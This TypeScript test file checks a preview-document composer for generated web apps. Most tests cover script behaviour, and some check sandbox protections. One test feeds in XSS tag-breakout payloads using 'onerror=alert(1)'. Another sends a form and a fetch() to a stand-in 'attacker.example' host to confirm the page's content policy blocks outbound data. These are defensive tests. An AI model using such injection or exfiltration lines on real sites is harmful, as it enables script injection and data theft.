import { createContext, runInContext, type Context } from "node:vm";

import { describe, expect, it } from "vitest";

import { composePreviewDocument } from "@/lib/preview";

function runPreviewScripts(
  document: string,
  context: Record<string, unknown>,
): Context {
  const scripts = Array.from(
    document.matchAll(/<script>([\s\S]*?)<\/script>/g),
    (match) => match[1],
  );
  const vmContext = createContext(context);

  for (const script of scripts) {
    runInContext(script, vmContext);
  }

  return vmContext;
}

describe("composePreviewDocument", () => {
  it("composes body HTML, CSS, and JavaScript into a complete document", () => {
    const document = composePreviewDocument({
      html: '<button id="save">Save</button>',
      css: "button { color: tomato; }",
      javascript: "document.querySelector('#save').disabled = true;",
    });

    expect(document).toContain("<!doctype html>");
    expect(document).toContain('<button id="save">Save</button>');
    expect(document).toContain("button { color: tomato; }");
    expect(document).toContain("document.querySelector('#save').disabled = true;");
  });

  it("neutralizes closing style and script tags in generated source", () => {
    const document = composePreviewDocument({
      html: "<main>Safe</main>",
      css: "</style><img src=x onerror=alert(1)>",
      javascript: "</script><img src=x onerror=alert(1)>",
    });

    expect(document).not.toContain("</style><img");
    expect(document).not.toContain("</script><img");
    expect(document).toContain("<\\/style><img");
    expect(document).toContain("<\\/script><img");
  });

  it("blocks generated applications from sending data to external origins", () => {
    const document = composePreviewDocument({
      html: '<form action="https://attacker.example"><input name="secret"></form>',
      css: "",
      javascript: "fetch('https://attacker.example')",
    });

    expect(document).toContain("connect-src 'none'");
    expect(document).toContain("form-action 'none'");
    expect(document).toContain("base-uri 'none'");
    expect(document).toContain("img-src data: blob:");
    expect(document).not.toContain("img-src data: blob: https:");
    expect(document).toContain("font-src data:");
    expect(document).not.toContain("font-src data: https:");
  });

  it("keeps generated interactions running when they use browser storage", () => {
    const document = composePreviewDocument({
      html: '<button id="save">Save</button>',
      css: "",
      javascript: `
        localStorage.setItem("draft", "ready");
        if (localStorage.getItem("draft") !== "ready") {
          throw new Error("Storage is unavailable");
        }
        window.localStorage.setItem("view", "board");
        if (window.localStorage.getItem("view") !== "board") {
          throw new Error("Window storage is unavailable");
        }
        document.querySelector("#save").addEventListener("click", () => {});
      `,
    });
    const listeners = new Map<string, () => void>();
    const errors: unknown[][] = [];
    const context: Record<string, unknown> = {
      console: {
        error: (...args: unknown[]) => errors.push(args),
        warn: (...args: unknown[]) => errors.push(args),
      },
      document: {
        addEventListener: () => {},
        querySelector: () => ({
          addEventListener: (type: string, listener: () => void) => {
            listeners.set(type, listener);
          },
        }),
      },
    };
    context.window = context;
    Object.defineProperty(context, "localStorage", {
      configurable: true,
      get() {
        throw new DOMException("Storage is unavailable", "SecurityError");
      },
    });
    Object.defineProperty(context, "sessionStorage", {
      configurable: true,
      get() {
        throw new DOMException("Storage is unavailable", "SecurityError");
      },
    });

    runPreviewScripts(document, context);

    expect(errors).toEqual([]);
    expect(listeners.has("click")).toBe(true);
  });

  it("exposes generated global functions for inline HTML event handlers", () => {
    const document = composePreviewDocument({
      html: '<button onclick="save()">Save</button><output id="status">idle</output>',
      css: "",
      javascript: `
        function save() {
          document.querySelector("#status").textContent = "saved";
        }
      `,
    });
    const status = { textContent: "idle" };
    const context: Record<string, unknown> = {
      console,
      document: {
        addEventListener: () => {},
        querySelector: () => status,
      },
    };
    context.window = context;

    runPreviewScripts(document, context);

    expect(context.save).toBeTypeOf("function");
    (context.save as () => void)();
    expect(status.textContent).toBe("saved");
  });

  it("exposes generated application instances to inline HTML event handlers", () => {
    const document = composePreviewDocument({
      html: '<button onclick="taskManager.completeTask()">Complete</button><output id="status">active</output>',
      css: "",
      javascript: `
        class TaskManager {
          completeTask() {
            document.querySelector("#status").textContent = "completed";
          }
        }
        const taskManager = new TaskManager();
      `,
    });
    const status = { textContent: "active" };
    const context: Record<string, unknown> = {
      console,
      document: {
        addEventListener: () => {},
        querySelector: () => status,
      },
    };
    context.window = context;
    const vmContext = runPreviewScripts(document, context);
    runInContext("taskManager.completeTask()", vmContext);

    expect(status.textContent).toBe("completed");
  });

  it("renders common Chart.js-style configurations without an external library", () => {
    const document = composePreviewDocument({
      html: '<canvas id="expense-chart"></canvas>',
      css: "",
      javascript: `
        var Chart;
        const expenseChart = new Chart(document.querySelector("#expense-chart").getContext("2d"), {
          type: "bar",
          data: {
            labels: ["Food", "Rent"],
            datasets: [{ data: [30, 70], backgroundColor: ["#f97316", "#6366f1"] }]
          }
        });
        expenseChart.data.datasets[0].data = [45, 55];
        expenseChart.update();
      `,
    });
    const drawCalls: string[] = [];
    const fillColors: string[] = [];
    const canvas = { width: 320, height: 180 };
    const renderingContext = {
      canvas,
      set fillStyle(value: string) {
        fillColors.push(value);
      },
      beginPath: () => drawCalls.push("beginPath"),
      clearRect: () => drawCalls.push("clearRect"),
      fill: () => drawCalls.push("fill"),
      fillRect: () => drawCalls.push("fillRect"),
      lineTo: () => drawCalls.push("lineTo"),
      moveTo: () => drawCalls.push("moveTo"),
      stroke: () => drawCalls.push("stroke"),
    };
    const errors: unknown[][] = [];
    const context: Record<string, unknown> = {
      Chart: { nodeName: "CANVAS" },
      console: {
        error: (...args: unknown[]) => errors.push(args),
        warn: (...args: unknown[]) => errors.push(args),
      },
      document: {
        addEventListener: () => {},
        querySelector: () => ({ getContext: () => renderingContext }),
      },
    };
    context.window = context;

    runPreviewScripts(document, context);

    expect(errors).toEqual([]);
    expect(drawCalls).toContain("clearRect");
    expect(drawCalls.filter((call) => call === "fillRect")).toHaveLength(4);
    expect(fillColors).toEqual([
      "#f97316",
      "#6366f1",
      "#f97316",
      "#6366f1",
    ]);
  });
});
